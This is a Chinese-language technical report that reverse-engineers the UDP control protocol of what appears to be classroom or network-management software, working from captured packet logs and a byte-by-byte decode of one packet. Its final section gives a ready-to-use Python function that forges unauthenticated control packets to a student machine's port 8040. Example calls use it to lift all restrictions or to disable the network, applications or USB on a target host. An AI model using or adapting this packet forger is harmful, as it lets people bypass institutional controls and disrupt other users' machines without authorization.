## 一、✅ 最终事实：载荷 = `/*//` + JSON（抓包实证）

### 决定性证据：captured_logs 真实抓包

来自 `evidence/captured-logs/192.168.2.59_20260909-161006_7383.log` 第 1418-1420 行：

```
[收] bind=0.0.0.0:8040  来自 192.168.2.76:50642  共 106 字节
HEX: f4010000 00000000 00000000 5a000000 2f2a2f2f 7b224374726c436f6465223a30...
```

### 逐字节解析（验证通过）

| 偏移 | 字节 | 含义 |
|---|---|---|
| 0-3 | `f4 01 00 00` | cmdType = **500** |
| 4-7 | `00 00 00 00` | flag1 = 0 |
| 8-11 | `00 00 00 00` | flag2 = 0 |
| 12-15 | `5a 00 00 00` | payloadLen = **90** |
| 16-19 | `2f 2a 2f 2f` | **`/*//`**（载荷前缀！） |
| 20-... | `7b224374...` | JSON `{"CtrlCode":0,...}` |

**算术校验**：总长 106 = 16（头）+ 90（载荷）；载荷 90 = 4（`/*//`）+ 86（JSON）→ **`/*//` 计入 payloadLen**，是载荷的一部分，**不是死代码**。

### 结论

```
报文 = [cmdType:u32][flag1:u32][flag2:u32][payloadLen:u32] + "/*//" + JSON
        500          0          0          90
```

> 📌 你仓库 `NET_LIMIT_PAYLOAD_RESEARCH.md` 原始结论「载荷 = `/*//` + JSON」**是正确的**；本报告曾一度错误地将其"纠正"为无前缀，现予恢复。

## 七、工具开发最小报文（已按抓包校准）

```python
import struct, json, socket

def build_ctrl(ctrl_code, host, port=8040, extra=None):
    payload_obj = {"CtrlCode": ctrl_code, "apps": [], "cites": [], "keys": [],
                   "sendState": 1, "tipInfo": "", "serverIp": ""}
    if extra:
        payload_obj.update(extra)
    body = b"/*//" + json.dumps(payload_obj, separators=(',', ':')).encode('utf-8')
    hdr = struct.pack("<IIII", 500, 0, 0, len(body))
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(hdr + body, (host, port))
    s.close()

# 关闭全部管控（抓包样本 CtrlCode=0）
build_ctrl(0, "192.168.1.100")
# 禁用网络
build_ctrl(0x01, "192.168.1.100")
# 禁用应用
build_ctrl(0x10, "192.168.1.100")
# 禁 USB
build_ctrl(0x100, "192.168.1.100")
```

> 抓包样本：源端口随机（50642），目标 `学生机IP:8040`，UDP 单播。
